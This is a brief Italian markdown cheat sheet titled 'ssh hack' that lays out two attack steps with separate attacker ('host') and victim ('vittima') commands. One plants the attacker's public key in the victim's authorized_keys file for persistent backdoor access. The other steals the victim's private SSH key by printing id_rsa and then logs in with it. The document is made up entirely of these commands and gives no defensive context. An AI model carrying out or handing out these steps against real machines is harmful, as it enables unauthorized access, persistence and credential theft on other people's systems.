# ssh hack

## aggiungere PUB_KEY 

host:
```
ssh-keygen -t rsa
export PUBLIC_KEY=$(cat <key.pub>)
```

vittima:
```
mkdir -p /home/<USER>/.ssh
echo $PUBLIC_KEY >> /home/<USER>/.ssh/authorized_keys
```


## furto della PRIV_KEY

vittima (copiare negli appunti):
```
cat /<USER>/.ssh/id_rsa
```

host (incollare `./priv_key`):
```
ssh -i priv_key <IP>
```